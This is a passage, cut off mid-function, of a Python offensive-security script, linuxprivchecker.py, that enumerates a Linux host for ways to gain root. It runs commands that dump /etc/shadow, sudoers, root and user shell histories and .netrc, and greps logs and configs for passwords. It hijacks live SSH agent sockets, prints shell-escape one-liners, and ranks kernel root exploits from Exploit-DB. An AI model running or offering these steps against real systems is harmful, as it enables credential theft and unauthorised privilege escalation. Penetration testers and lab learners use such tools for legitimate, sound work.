#!/usr/bin/python

"""
###############################################################################################################
## [Title]: linuxprivchecker.py -- a Linux Privilege Escalation Check Script
## [Original Author]: Mike Czumak (T_v3rn1x) -- @SecuritySift
##  [Maintainer]: Michael Contino -- @Sleventyeleven
##-------------------------------------------------------------------------------------------------------------
## [Details]:
## This script is intended to be executed locally on a Linux box to enumerate basic system info and
## search for common privilege escalation vectors such as world writable files, misconfigurations, clear-text
## passwords and applicable exploits.
##-------------------------------------------------------------------------------------------------------------
## [Modification, Distribution, and Attribution]:
## You are free to modify and/or distribute this script as you wish.  I only ask that you maintain original
## author attribution and not attempt to sell it or incorporate it into any commercial offering (as if it's
## worth anything anyway :)
###############################################################################################################
TODO:
Add search for writable and/or missing library files
Add detection and enumeratation for systemd
Add search for accessiable ssh sockets
Add search for ssh keys
Add search for know access tokens
Expand Sudo support to include rules in sudoers.d
Add more high profile exploit checks (ie shellshock)
"""

# conditional import for older versions of python not compatible with subprocess
try:
    import subprocess as sub

    compatmode = 0  # newer version of python, no need for compatibility mode
except ImportError:
    import os  # older version of python, need to use os instead

    compatmode = 1


def execute_cmd(cmddict):
    """
    Execute Command (execute_cmd)
    loop through dictionary, execute the commands, store the results, return updated dict

    :param cmddict: Dictionary of commands to execute and results
    :return: The command Dictionary with the commands results included
    """

    for item in cmddict:
        cmd = cmddict[item]["cmd"]
        if compatmode == 0:  # newer version of python, use preferred subprocess
            out, error = sub.Popen([cmd], stdout=sub.PIPE, stderr=sub.PIPE, shell=True).communicate()
            results = out.decode().split('\n')
        else:  # older version of python, use os.popen
            echo_stdout = os.popen(cmd, 'r')
            results = echo_stdout.read().split('\n')

        # write the results to the command Dictionary for each command run
        cmddict[item]["results"] = results

    return cmddict


def print_results(cmddict):
    """
    Print Results (printResults)
    Print results for each previously executed command, no return value

    :param cmddict: Dictionary of commands to execute and results
    :return: None
    """

    for item in cmddict:
        msg = cmddict[item]["msg"]
        results = cmddict[item]["results"]
        print("[+] " + msg)

        for result in results:
            if result.strip() != "":
                print("    " + result.strip())
    print()


def enum_system_info():
    """
    Basic System Info (get_system_info)
    Enumerate Basic System Information by executing simple commands than saving the results

    :return: Dictionary of system information results
    """

    print("[*] GETTING BASIC SYSTEM INFO...\n")

    sysinfo = {
        "OS": {"cmd": "cat /etc/issue", "msg": "Operating System", "results": []},
        "KERNEL": {"cmd": "cat /proc/version", "msg": "Kernel", "results": []},
        "HOSTNAME": {"cmd": "hostname", "msg": "Hostname", "results": []}
    }

    sysinfo = execute_cmd(sysinfo)
    print_results(sysinfo)

    return sysinfo


def enum_network_info():
    """
    Basic Network Info (get_network_info)
    Enumerate Basic Network Information by executing simple commands

    :return: Dictionary of Network information with results
    """

    print("[*] GETTING NETWORKING INFO...\n")

    netinfo = {
        "netinfo": {"cmd": "/sbin/ifconfig -a", "msg": "Interfaces", "results": []},
        "ROUTE": {"cmd": "route", "msg": "Route(s)", "results": []},
        "NETSTAT": {"cmd": "netstat -antup | grep -v 'TIME_WAIT'", "msg": "Netstat", "results": []}
    }

    netinfo = execute_cmd(netinfo)
    print_results(netinfo)


def enum_filesystem_info():
    """
    Enumerate Filesystem Information (enum_filesystem_info)
    Enumerate mounted and/or configured filesystems and save the results

    :return: Dictionary with drive information results
    TODO: Parse parse out the filesystem results for remote file systems and credentials
    """

    print("[*] GETTING FILESYSTEM INFO...\n")

    driveinfo = {
        "MOUNT": {"cmd": "mount", "msg": "Mount results", "results": []},
        "FSTAB": {"cmd": "cat /etc/fstab 2>/dev/null", "msg": "fstab entries", "results": []}
    }

    driveinfo = execute_cmd(driveinfo)
    print_results(driveinfo)

    return driveinfo


def enum_cron_jobs():
    """
    Enumerate crontab Information (enum_cron_jobs)
    Enumerate system and user cron jobs and save the results

    :return: None
    TODO: Should also parse at and systemd jobs for possible information as well
    """
    croninfo = {
        "CRON": {"cmd": "ls -la /etc/cron* 2>/dev/null", "msg": "Scheduled cron jobs", "results": []},
        "CRONW": {"cmd": "ls -aRl /etc/cron* 2>/dev/null | awk '$1 ~ /w.$/' 2>/dev/null", "msg": "Writable cron dirs",
                  "results": []},
        "CRONU": {"cmd": "crontab -l 2>/dev/null", "msg": "Users cron jobs", "results": []}
    }

    croninfo = execute_cmd(croninfo)
    print_results(croninfo)


def enum_user_info():
    """
    Enumerate User Information (enum_user_info)
    Enumerate current user information and save the results

    :return: Dictionary with the user information commands and results
    """
    print("\n[*] ENUMERATING USER AND ENVIRONMENTAL INFO...\n")

    userinfo = {
        "WHOAMI": {"cmd": "whoami", "msg": "Current User", "results": []},
        "ID": {"cmd": "id", "msg": "Current User ID", "results": []},
        "ALLUSERS": {"cmd": "cat /etc/passwd", "msg": "All users", "results": []},
        "SUPUSERS": {"cmd": "grep -v -E '^#' /etc/passwd | awk -F: '$3 == 0{print $1}'", "msg": "Super Users Found:",
                     "results": []},
        "ENV": {"cmd": "env 2>/dev/null | grep -v 'LS_COLORS'", "msg": "Environment", "results": []},
        "SUDOERS": {"cmd": "cat /etc/sudoers 2>/dev/null | grep -v '#' 2>/dev/null", "msg": "Sudoers (privileged)",
                    "results": []},
        "SCREENS": {"cmd": "screen -ls 2>/dev/null", "msg": "List out any screens running for the current user",
                    "results": []},
        "LOGGEDIN": {"cmd": "who -a 2>/dev/null", "msg": "Logged in User Activity", "results": []}
    }

    userinfo = execute_cmd(userinfo)
    print_results(userinfo)

    if "root" in userinfo["ID"]["results"][0]:
        print("[!] ARE YOU SURE YOU'RE NOT ROOT ALREADY?\n")
        exit()

    return userinfo


def enum_user_history_files():
    """
    Enumerate User History Files (enum_user_history_files)
    Enumerate current user History Files and save content to results

    :return: None
    """
    print("\n[*] ENUMERATING USER History Files..\n")

    historyfiles = {
        "RHISTORY": {"cmd": "ls -la /root/.*_history 2>/dev/null",
                     "msg": " See if you have access too Root user history (depends on privs)", "results": []},
        "BASHHISTORY": {"cmd": "cat ~/.bash_history 2>/dev/null",
                        "msg": " Get the contents of bash history file for current user", "results": []},
        "NANOHISTORY": {"cmd": "cat ~/.nano_history 2>/dev/null",
                        "msg": " Try to get the contents of nano history file for current user", "results": []},
        "ATFTPHISTORY": {"cmd": "cat ~/.atftp_history 2>/dev/null",
                         "msg": " Try to get the contents of atftp history file for current user", "results": []},
        "MYSQLHISTORY": {"cmd": "cat ~/.mysql_history 2>/dev/null",
                         "msg": " Try to get the contents of mysql history file for current user", "results": []},
        "PHPHISTORY": {"cmd": "cat ~/.php_history 2>/dev/null",
                       "msg": " Try to get the contents of php history file for current user", "results": []},
        "PYTHONHISTORY": {"cmd": "cat ~/.python_history 2>/dev/null",
                          "msg": " Try to get the contents of python history file for current user", "results": []},
        "REDISHISTORY": {"cmd": "cat ~/.rediscli_history 2>/dev/null",
                         "msg": " Try to get the contents of redis cli history file for current user", "results": []},
        "TDSQLHISTORY": {"cmd": "cat ~/.tdsql_history 2>/dev/null",
                         "msg": " Try to get the contents of tdsql history file for current user", "results": []}
    }

    historyfiles = execute_cmd(historyfiles)
    print_results(historyfiles)


def enum_rc_files():
    """
    Enumerate User RCFiles (enum_rc_files)
    Enumerate current user RC Files and save content to results

    :return: None
    """
    print("\n[*] ENUMERATING USER *.rc Style Files For INFO...\n")

    rcfiles = {
        "GBASHRC": {"cmd": "cat /etc/bashrc 2>/dev/null",
                    "msg": " Get the contents of bash rc file form global config file", "results": []},
        "BASHRC": {"cmd": "cat ~/.bashrc 2>/dev/null", "msg": "Get the contents of bash rc file for current user",
                   "results": []},
        "SCREENRC": {"cmd": "cat ~/.screenrc 2>/dev/null",
                     "msg": " Try to get the contents of screen rc file for current user", "results": []},
        "GSCREENRC": {"cmd": "cat /etc/screenrc 2>/dev/null",
                      "msg": "Try to get the contents of screen rc file form global config file", "results": []},
        "VIRC": {"cmd": "cat ~/.virc 2>/dev/null", "msg": " Try to get the contents of vi rc file for current user",
                 "results": []},
        "MYSQLRC": {"cmd": "cat ~/.mysqlrc 2>/dev/null",
                    "msg": " Try to get the contents of mysql rc file for current user", "results": []},
        "NETRC": {"cmd": "cat ~/.netrc 2>/dev/null",
                  "msg": " Try to get the contents of legacy net rc file for current user", "results": []}
    }

    rcfiles = execute_cmd(rcfiles)
    print_results(rcfiles)


def search_file_perms():
    """
    Search File and Folder Permissions (search_file_perms)
    Search the identified file systems for insure file and folder permissions

    :return: None
    """

    print("[*] ENUMERATING FILE AND DIRECTORY PERMISSIONS/CONTENTS...\n")

    fdperms = {
        "WWDIRSROOT": {
            "cmd": "find / \( -wholename '/home/homedir*' -prune \) -o \( -type d -perm -0002 \) -exec ls -ld '{}' ';' 2>/dev/null | grep root",
            "msg": "World Writeable Directories for User/Group 'Root'", "results": []},
        "WWDIRS": {
            "cmd": "find / \( -wholename '/home/homedir*' -prune \) -o \( -type d -perm -0002 \) -exec ls -ld '{}' ';' 2>/dev/null | grep -v root",
            "msg": "World Writeable Directories for Users other than Root", "results": []},
        "WWFILES": {
            "cmd": "find / \( -wholename '/home/homedir/*' -prune -o -wholename '/proc/*' -prune \) -o \( -type f -perm -0002 \) -exec ls -l '{}' ';' 2>/dev/null",
            "msg": "World Writable Files", "results": []},
        "SUID": {"cmd": "find / \( -perm -2000 -o -perm -4000 \) -exec ls -ld {} \; 2>/dev/null",
                 "msg": "SUID/SGID Files and Directories", "results": []},
        "ROOTHOME": {"cmd": "ls -ahlR /root 2>/dev/null", "msg": "Checking if root's home folder is accessible",
                     "results": []}
    }

    fdperms = execute_cmd(fdperms)
    print_results(fdperms)


def search_file_passwords():
    """
    Search File for passwords (search_file_passwords)
    Search the identified file systems for files with potential credentials

    :return: None
    :TODO: Add searches for common cred files like ssh keys and access tokens
    """

    pwdfiles = {
        "LOGPWDS": {"cmd": "find /var/log -name '*.log' 2>/dev/null | xargs -l10 egrep 'pwd|password' 2>/dev/null",
                    "msg": "Logs containing keyword 'password'", "results": []},
        "CONFPWDS": {"cmd": "find /etc -name '*.c*' 2>/dev/null | xargs -l10 egrep 'pwd|password' 2>/dev/null",
                     "msg": "Config files containing keyword 'password'", "results": []},
        "SHADOW": {"cmd": "cat /etc/shadow 2>/dev/null", "msg": "Shadow File (Privileged)", "results": []}
    }

    pwdfiles = execute_cmd(pwdfiles)
    print_results(pwdfiles)


def enum_procs_pkgs(sysinfo):
    """
    Enumerate Processes and Packages (enum_procs_pkgs)
    Enumerate all running processes and installed packages

    :return: Dictionary with process and package information
    """

    # Processes and Applications
    print("[*] ENUMERATING PROCESSES AND APPLICATIONS...\n")

    if "debian" in sysinfo["KERNEL"]["results"][0] or "ubuntu" in sysinfo["KERNEL"]["results"][0]:
        getpkgs = "dpkg -l | awk '{$1=$4=\"\"; print $0}'"  # debian
    else:
        getpkgs = "rpm -qa | sort -u"  # RH/other

    pkgsandprocs = {
        "PROCS": {"cmd": "ps waux | awk '{print $1,$2,$9,$10,$11}'", "msg": "Current processes", "results": []},
        "PKGS": {"cmd": getpkgs, "msg": "Installed Packages", "results": []}
    }

    pkgsandprocs = execute_cmd(pkgsandprocs)
    print_results(pkgsandprocs)  # comment to reduce output

    otherapps = {
        "SUDO": {"cmd": "sudo -V | grep version 2>/dev/null",
                 "msg": "Sudo Version (Check out http://www.exploit-db.com/search/?action=search&filter_page=1&filter_description=sudo)",
                 "results": []},
        "APACHE": {"cmd": "apache2 -v; apache2ctl -M; httpd -v; apachectl -l 2>/dev/null",
                   "msg": "Apache Version and Modules", "results": []},
        "APACHECONF": {"cmd": "cat /etc/apache2/apache2.conf 2>/dev/null", "msg": "Apache Config File", "results": []},
        "SSHAGENTS": {
            "cmd": "for AGENT in $(ls /tmp| egrep 'ssh-.{10}$'); do echo $AGENT $(stat -c '%U' /tmp/$AGENT);export SSH_AUTH_SOCK=/tmp/$AGENT/$(ls /tmp/$AGENT);timeout 10 ssh-add -l 2>/dev/null;done;",
            "msg": "Checking for Active SSH Agents", "results": []}
    }

    execute_cmd(otherapps)
    print_results(otherapps)

    return pkgsandprocs


def enum_root_pkg_proc(pkgsandprocs, userinfo):
    """
    Enumerate root packages (enum_root_pkg_proc)
    Enumerate Root/superuser packages to target based on process information
    :param pkgsandprocs: Dictionary with process and package information
    :param userinfo:  Dictionary with the user information commands and results

    :return: The drive information Dictionary with the commands results included
    """
    print("[*] IDENTIFYING PROCESSES AND PACKAGES RUNNING AS ROOT OR OTHER SUPERUSER...\n")

    # find the package information for the processes currently running
    # under root or another super user

    procs = pkgsandprocs["PROCS"]["results"]
    pkgs = pkgsandprocs["PKGS"]["results"]
    supusers = userinfo["SUPUSERS"]["results"]
    procdict = {}  # dictionary to hold the processes running as super users

    for proc in procs:  # loop through each process
        relatedpkgs = []  # list to hold the packages related to a process
        try:
            for user in supusers:  # loop through the known super users
                if (user != "") and (user in proc):  # if the process is being run by a super user
                    procname = proc.split(" ")[4]  # grab the process name
                    if "/" in procname:
                        splitname = procname.split("/")
                        procname = splitname[len(splitname) - 1]
                    for pkg in pkgs:  # loop through the packages
                        if not len(procname) < 3:  # name too short to get reliable package results
                            if procname in pkg:
                                if procname in procdict:
                                    relatedpkgs = procdict[proc]  # if already in the dict, grab its pkg list
                                if pkg not in relatedpkgs:
                                    relatedpkgs.append(pkg)  # add pkg to the list
                    procdict[proc] = relatedpkgs  # add any found related packages to the process dictionary entry
        except:
            pass

    for key in procdict:
        print("    " + key)  # print the process name
        try:
            if not procdict[key][0] == "":  # only print the rest if related packages were found
                print("        Possible Related Packages: ")
                for entry in procdict[key]:
                    print("            " + entry)  # print each related package
        except IndexError:
            pass


def enum_dev_tools():
    """
    Enumerate Development Tools (enum_dev_tools)
    Enumerate installed development tools and save the results

    :return: Dictionary of installed development tool results
    """

    print("[*] ENUMERATING INSTALLED LANGUAGES/TOOLS FOR SPLOIT BUILDING...\n")

    devtools = {
        "TOOLS": {"cmd": "which awk perl python ruby gcc cc vi vim nmap find netcat nc wget tftp ftp 2>/dev/null",
                  "msg": "Installed Tools", "results": []}}
    execute_cmd(devtools)
    print_results(devtools)

    return devtools


def enum_shell_esapes(devtools):
    """
    Enumerate Filesystem Information (enum_shell_escapes)
    Enumerate possible shell escape techniques based on available development tools
    :param devtools: Dictionary of installed development tool results

    :return: None
    """

    print("[+] Related Shell Escape Sequences...\n")

    escapecmd = {
        "vi": [":!bash", ":set shell=/bin/bash:shell"],
        "awk": ["awk 'BEGIN {system(\"/bin/bash\")}'"],
        "perl": ["perl -e 'exec \"/bin/bash\";'"],
        "find": ["find / -exec /usr/bin/awk 'BEGIN {system(\"/bin/bash\")}' \\;"],
        "nmap": ["--interactive"]
    }

    for cmd in escapecmd:
        for result in devtools["TOOLS"]["results"]:
            if cmd in result:
                for item in escapecmd[cmd]:
                    print("    " + cmd + "-->\t" + item)


def find_likely_exploits(sysinfo, devtools, pkgsandprocs, driveinfo):
    """
    Enumerate Likely Exploits (find_likely_exploits)
    Enumerate possible exploits based on system information and installed packages
    :param sysinfo: Dictionary of system information results
    :param devtools: Dictionary of installed development tool results
    :param pkgsandprocs: Dictionary with process and package information
    :param driveinfo: Dictionary with drive information results

    :return: The drive information Dictionary with the commands results included
    TODO: Parse parse out the filesystem results for remote file systems and credentials
    """

    print("[*] FINDING RELEVENT PRIVILEGE ESCALATION EXPLOITS...\n")

    # Now check for relevant exploits (note: this list should be updated over time; source: Exploit-DB)
    # sploit format = sploit name : {minversion, maxversion, exploitdb#, language, {keywords for applicability}} -- current keywords are 'kernel', 'proc', 'pkg' (unused), and 'os'
    sploits = {
        "2.2.x-2.4.x ptrace kmod local exploit": {"minver": "2.2", "maxver": "2.4.99", "exploitdb": "3", "lang": "c",
                                                  "keywords": {"loc": ["kernel"], "val": "kernel"}},
        "< 2.4.20 Module Loader Local Root Exploit": {"minver": "0", "maxver": "2.4.20", "exploitdb": "12", "lang": "c",
                                                      "keywords": {"loc": ["kernel"], "val": "kernel"}},
        "2.4.22 "'do_brk()'" local Root Exploit (PoC)": {"minver": "2.4.22", "maxver": "2.4.22", "exploitdb": "129",
                                                         "lang": "asm",
                                                         "keywords": {"loc": ["kernel"], "val": "kernel"}},
        "<= 2.4.22 (do_brk) Local Root Exploit (working)": {"minver": "0", "maxver": "2.4.22", "exploitdb": "131",
                                                            "lang": "c",
                                                            "keywords": {"loc": ["kernel"], "val": "kernel"}},
        "2.4.x mremap() bound checking Root Exploit": {"minver": "2.4", "maxver": "2.4.99", "exploitdb": "145",
                                                       "lang": "c", "keywords": {"loc": ["kernel"], "val": "kernel"}},
        "<= 2.4.29-rc2 uselib() Privilege Elevation": {"minver": "0", "maxver": "2.4.29", "exploitdb": "744",
                                                       "lang": "c", "keywords": {"loc": ["kernel"], "val": "kernel"}},
        "2.4 uselib() Privilege Elevation Exploit": {"minver": "2.4", "maxver": "2.4", "exploitdb": "778", "lang": "c",
                                                     "keywords": {"loc": ["kernel"], "val": "kernel"}},
        "2.4.x / 2.6.x uselib() Local Privilege Escalation Exploit": {"minver": "2.4", "maxver": "2.6.99",
                                                                      "exploitdb": "895", "lang": "c",
                                                                      "keywords": {"loc": ["kernel"], "val": "kernel"}},
        "2.4/2.6 bluez Local Root Privilege Escalation Exploit (update)": {"minver": "2.4", "maxver": "2.6.99",
                                                                           "exploitdb": "926", "lang": "c",
                                                                           "keywords": {"loc": ["proc", "pkg"],
                                                                                        "val": "bluez"}},
        "<= 2.6.11 (CPL 0) Local Root Exploit (k-rad3.c)": {"minver": "0", "maxver": "2.6.11", "exploitdb": "1397",
                                                            "lang": "c",
                                                            "keywords": {"loc": ["kernel"], "val": "kernel"}},
        "MySQL 4.x/5.0 User-Defined Function Local Privilege Escalation Exploit": {"minver": "0", "maxver": "99",
                                                                                   "exploitdb": "1518", "lang": "c",
                                                                                   "keywords": {"loc": ["proc", "pkg"],
                                                                                                "val": "mysql"}},
        "2.6.13 <= 2.6.17.4 sys_prctl() Local Root Exploit": {"minver": "2.6.13", "maxver": "2.6.17.4",
                                                              "exploitdb": "2004", "lang": "c",
                                                              "keywords": {"loc": ["kernel"], "val": "kernel"}},
        "2.6.13 <= 2.6.17.4 sys_prctl() Local Root Exploit (2)": {"minver": "2.6.13", "maxver": "2.6.17.4",
                                                                  "exploitdb": "2005", "lang": "c",
                                                                  "keywords": {"loc": ["kernel"], "val": "kernel"}},
        "2.6.13 <= 2.6.17.4 sys_prctl() Local Root Exploit (3)": {"minver": "2.6.13", "maxver": "2.6.17.4",
                                                                  "exploitdb": "2006", "lang": "c",
                                                                  "keywords": {"loc": ["kernel"], "val": "kernel"}},
        "2.6.13 <= 2.6.17.4 sys_prctl() Local Root Exploit (4)": {"minver": "2.6.13", "maxver": "2.6.17.4",
                                                                  "exploitdb": "2011", "lang": "sh",
                                                                  "keywords": {"loc": ["kernel"], "val": "kernel"}},
        "<= 2.6.17.4 (proc) Local Root Exploit": {"minver": "0", "maxver": "2.6.17.4", "exploitdb": "2013", "lang": "c",
                                                  "keywords": {"loc": ["kernel"], "val": "kernel"}},
        "2.6.13 <= 2.6.17.4 prctl() Local Root Exploit (logrotate)": {"minver": "2.6.13", "maxver": "2.6.17.4",
                                                                      "exploitdb": "2031", "lang": "c",
                                                                      "keywords": {"loc": ["kernel"], "val": "kernel"}},
        "Ubuntu/Debian Apache 1.3.33/1.3.34 (CGI TTY) Local Root Exploit": {"minver": "4.10", "maxver": "7.04",
                                                                            "exploitdb": "3384", "lang": "c",
                                                                            "keywords": {"loc": ["os"],
                                                                                         "val": "debian"}},
        "Linux/Kernel 2.4/2.6 x86-64 System Call Emulation Exploit": {"minver": "2.4", "maxver": "2.6",
                                                                      "exploitdb": "4460", "lang": "c",
                                                                      "keywords": {"loc": ["kernel"], "val": "kernel"}},
        "< 2.6.11.5 BLUETOOTH Stack Local Root Exploit": {"minver": "0", "maxver": "2.6.11.5", "exploitdb": "4756",
                                                          "lang": "c",
                                                          "keywords": {"loc": ["proc", "pkg"], "val": "bluetooth"}},
        "2.6.17 - 2.6.24.1 vmsplice Local Root Exploit": {"minver": "2.6.17", "maxver": "2.6.24.1", "exploitdb": "5092",
                                                          "lang": "c",
                                                          "keywords": {"loc": ["kernel"], "val": "kernel"}},
        "2.6.23 - 2.6.24 vmsplice Local Root Exploit": {"minver": "2.6.23", "maxver": "2.6.24", "exploitdb": "5093",
                                                        "lang": "c", "keywords": {"loc": ["os"], "val": "debian"}},
        "Debian OpenSSL Predictable PRNG Bruteforce SSH Exploit": {"minver": "0", "maxver": "99", "exploitdb": "5720",
                                                                   "lang": "python",
                                                                   "keywords": {"loc": ["os"], "val": "debian"}},
        "Linux Kernel < 2.6.22 ftruncate()/open() Local Exploit": {"minver": "0", "maxver": "2.6.22",
                                                                   "exploitdb": "6851", "lang": "c",
                                                                   "keywords": {"loc": ["kernel"], "val": "kernel"}},
        "< 2.6.29 exit_notify() Local Privilege Escalation Exploit": {"minver": "0", "maxver": "2.6.29",
                                                                      "exploitdb": "8369", "lang": "c",
                                                                      "keywords": {"loc": ["kernel"], "val": "kernel"}},
        "2.6 UDEV Local Privilege Escalation Exploit": {"minver": "2.6", "maxver": "2.6.99", "exploitdb": "8478",
                                                        "lang": "c",
                                                        "keywords": {"loc": ["proc", "pkg"], "val": "udev"}},
        "2.6 UDEV < 141 Local Privilege Escalation Exploit": {"minver": "2.6", "maxver": "2.6.99", "exploitdb": "8572",
                                                              "lang": "c",
                                                              "keywords": {"loc": ["proc", "pkg"], "val": "udev"}},
        "2.6.x ptrace_attach Local Privilege Escalation Exploit": {"minver": "2.6", "maxver": "2.6.99",
                                                                   "exploitdb": "8673", "lang": "c",
                                                                   "keywords": {"loc": ["kernel"], "val": "kernel"}},
        "2.6.29 ptrace_attach() Local Root Race Condition Exploit": {"minver": "2.6.29", "maxver": "2.6.29",
                                                                     "exploitdb": "8678", "lang": "c",
                                                                     "keywords": {"loc": ["kernel"], "val": "kernel"}},
        "Linux Kernel <=2.6.28.3 set_selection() UTF-8 Off By One Local Exploit": {"minver": "0", "maxver": "2.6.28.3",
                                                                                   "exploitdb": "9083", "lang": "c",
                                                                                   "keywords": {"loc": ["kernel"],
                                                                                                "val": "kernel"}},
        "Test Kernel Local Root Exploit 0day": {"minver": "2.6.18", "maxver": "2.6.30", "exploitdb": "9191",
                                                "lang": "c", "keywords": {"loc": ["kernel"], "val": "kernel"}},
        "PulseAudio (setuid) Priv. Escalation Exploit (ubu/9.04)(slack/12.2.0)": {"minver": "2.6.9", "maxver": "2.6.30",
                                                                                  "exploitdb": "9208", "lang": "c",
                                                                                  "keywords": {"loc": ["pkg"],
                                                                                               "val": "pulse"}},
        "2.x sock_sendpage() Local Ring0 Root Exploit": {"minver": "2", "maxver": "2.99", "exploitdb": "9435",
                                                         "lang": "c", "keywords": {"loc": ["kernel"], "val": "kernel"}},
        "2.x sock_sendpage() Local Root Exploit 2": {"minver": "2", "maxver": "2.99", "exploitdb": "9436", "lang": "c",
                                                     "keywords": {"loc": ["kernel"], "val": "kernel"}},
        "2.4/2.6 sock_sendpage() ring0 Root Exploit (simple ver)": {"minver": "2.4", "maxver": "2.6.99",
                                                                    "exploitdb": "9479", "lang": "c",
                                                                    "keywords": {"loc": ["kernel"], "val": "kernel"}},
        "2.6 < 2.6.19 (32bit) ip_append_data() ring0 Root Exploit": {"minver": "2.6", "maxver": "2.6.19",
                                                                     "exploitdb": "9542", "lang": "c",
                                                                     "keywords": {"loc": ["kernel"], "val": "kernel"}},
        "2.4/2.6 sock_sendpage() Local Root Exploit (ppc)": {"minver": "2.4", "maxver": "2.6.99", "exploitdb": "9545",
                                                             "lang": "c",
                                                             "keywords": {"loc": ["kernel"], "val": "kernel"}},
        "< 2.6.19 udp_sendmsg Local Root Exploit (x86/x64)": {"minver": "0", "maxver": "2.6.19", "exploitdb": "9574",
                                                              "lang": "c",
                                                              "keywords": {"loc": ["kernel"], "val": "kernel"}},
        "< 2.6.19 udp_sendmsg Local Root Exploit": {"minver": "0", "maxver": "2.6.19", "exploitdb": "9575", "lang": "c",
                                                    "keywords": {"loc": ["kernel"], "val": "kernel"}},
        "2.4/2.6 sock_sendpage() Local Root Exploit [2]": {"minver": "2.4", "maxver": "2.6.99", "exploitdb": "9598",
                                                           "lang": "c",
                                                           "keywords": {"loc": ["kernel"], "val": "kernel"}},
        "2.4/2.6 sock_sendpage() Local Root Exploit [3]": {"minver": "2.4", "maxver": "2.6.99", "exploitdb": "9641",
                                                           "lang": "c",
                                                           "keywords": {"loc": ["kernel"], "val": "kernel"}},
        "2.4.1-2.4.37 and 2.6.1-2.6.32-rc5 Pipe.c Privelege Escalation": {"minver": "2.4.1", "maxver": "2.6.32",
                                                                          "exploitdb": "9844", "lang": "python",
                                                                          "keywords": {"loc": ["kernel"],
                                                                                       "val": "kernel"}},
        "'pipe.c' Local Privilege Escalation Vulnerability": {"minver": "2.4.1", "maxver": "2.6.32",
                                                              "exploitdb": "10018", "lang": "sh",
                                                              "keywords": {"loc": ["kernel"], "val": "kernel"}},
        "2.6.18-20 2009 Local Root Exploit": {"minver": "2.6.18", "maxver": "2.6.20", "exploitdb": "10613", "lang": "c",
                                              "keywords": {"loc": ["kernel"], "val": "kernel"}},
        "Apache Spamassassin Milter Plugin Remote Root Command Execution": {"minver": "0", "maxver": "99",
                                                                            "exploitdb": "11662", "lang": "sh",
                                                                            "keywords": {"loc": ["proc"],
                                                                                         "val": "spamass-milter"}},
        "<= 2.6.34-rc3 ReiserFS xattr Privilege Escalation": {"minver": "0", "maxver": "2.6.34", "exploitdb": "12130",
                                                              "lang": "python",
                                                              "keywords": {"loc": ["mnt"], "val": "reiser"}},
        "Ubuntu PAM MOTD local root": {"minver": "7", "maxver": "10.04", "exploitdb": "14339", "lang": "sh",
                                       "keywords": {"loc": ["os"], "val": "ubuntu"}},
        "< 2.6.36-rc1 CAN BCM Privilege Escalation Exploit": {"minver": "0", "maxver": "2.6.36", "exploitdb": "14814",
                                                              "lang": "c",
                                                              "keywords": {"loc": ["kernel"], "val": "kernel"}},
        "Kernel ia32syscall Emulation Privilege Escalation": {"minver": "0", "maxver": "99", "exploitdb": "15023",
                                                              "lang": "c",
                                                              "keywords": {"loc": ["kernel"], "val": "kernel"}},
        "Linux RDS Protocol Local Privilege Escalation": {"minver": "0", "maxver": "2.6.36", "exploitdb": "15285",
                                                          "lang": "c",
                                                          "keywords": {"loc": ["kernel"], "val": "kernel"}},
        "<= 2.6.37 Local Privilege Escalation": {"minver": "0", "maxver": "2.6.37", "exploitdb": "15704", "lang": "c",
                                                 "keywords": {"loc": ["kernel"], "val": "kernel"}},
        "< 2.6.37-rc2 ACPI custom_method Privilege Escalation": {"minver": "0", "maxver": "2.6.37",
                                                                 "exploitdb": "15774", "lang": "c",
                                                                 "keywords": {"loc": ["kernel"], "val": "kernel"}},
        "CAP_SYS_ADMIN to root Exploit": {"minver": "0", "maxver": "99", "exploitdb": "15916", "lang": "c",
                                          "keywords": {"loc": ["kernel"], "val": "kernel"}},
        "CAP_SYS_ADMIN to Root Exploit 2 (32 and 64-bit)": {"minver": "0", "maxver": "99", "exploitdb": "15944",
                                                            "lang": "c",
                                                            "keywords": {"loc": ["kernel"], "val": "kernel"}},
        "< 2.6.36.2 Econet Privilege Escalation Exploit": {"minver": "0", "maxver": "2.6.36.2", "exploitdb": "17787",
                                                           "lang": "c",
                                                           "keywords": {"loc": ["kernel"], "val": "kernel"}},
        "Sendpage Local Privilege Escalation": {"minver": "0", "maxver": "99", "exploitdb": "19933", "lang": "ruby",
                                                "keywords": {"loc": ["kernel"], "val": "kernel"}},
        "2.4.18/19 Privileged File Descriptor Resource Exhaustion Vulnerability": {"minver": "2.4.18",
                                                                                   "maxver": "2.4.19",
                                                                                   "exploitdb": "21598", "lang": "c",
                                                                                   "keywords": {"loc": ["kernel"],
                                                                                                "val": "kernel"}},
        "2.2.x/2.4.x Privileged Process Hijacking Vulnerability (1)": {"minver": "2.2", "maxver": "2.4.99",
                                                                       "exploitdb": "22362", "lang": "c",
                                                                       "keywords": {"loc": ["kernel"],
                                                                                    "val": "kernel"}},
        "2.2.x/2.4.x Privileged Process Hijacking Vulnerability (2)": {"minver": "2.2", "maxver": "2.4.99",
                                                                       "exploitdb": "22363", "lang": "c",
                                                                       "keywords": {"loc": ["kernel"],
                                                                                    "val": "kernel"}},
        "Samba 2.2.8 Share Local Privilege Elevation Vulnerability": {"minver": "2.2.8", "maxver": "2.2.8",
                                                                      "exploitdb": "23674", "lang": "c",
                                                                      "keywords": {"loc": ["proc", "pkg"],
                                                                                   "val": "samba"}},
        "open-time Capability file_ns_capable() - Privilege Escalation Vulnerability": {"minver": "0", "maxver": "99",
                                                                                        "exploitdb": "25307",
                                                                                        "lang": "c",
                                                                                        "keywords": {"loc": ["kernel"],
                                                                                                     "val": "kernel"}},
        "open-time Capability file_ns_capable() Privilege Escalation": {"minver": "0", "maxver": "99",
                                                                        "exploitdb": "25450", "lang": "c",
                                                                        "keywords": {"loc": ["kernel"],
                                                                                     "val": "kernel"}},
    }

    # variable declaration
    os = sysinfo["OS"]["results"][0]
    version = sysinfo["KERNEL"]["results"][0].split(" ")[2].split("-")[0]
    langs = devtools["TOOLS"]["results"]
    procs = pkgsandprocs["PROCS"]["results"]
    kernel = str(sysinfo["KERNEL"]["results"][0])
    mount = driveinfo["MOUNT"]["results"]
    # pkgs = pkgsandprocs["PKGS"]["results"] # TODO currently not using packages for sploit appicability but may in future

    # lists to hold ranked, applicable sploits
    # note: this is a best-effort, basic ranking designed to help in prioritizing priv escalation exploit checks
    # all applicable exploits should be checked and this function could probably use some improvement
    avgprob = []
    highprob = []

    for sploit in sploits:
        lang = 0  # use to rank applicability of sploits
        keyword = sploits[sploit]["keywords"]["val"]
        sploitout = sploit + " || " + "http://www.exploit-db.com/exploits/" + sploits[sploit][
            "exploitdb"] + " || " + "Language=" + sploits[sploit]["lang"]
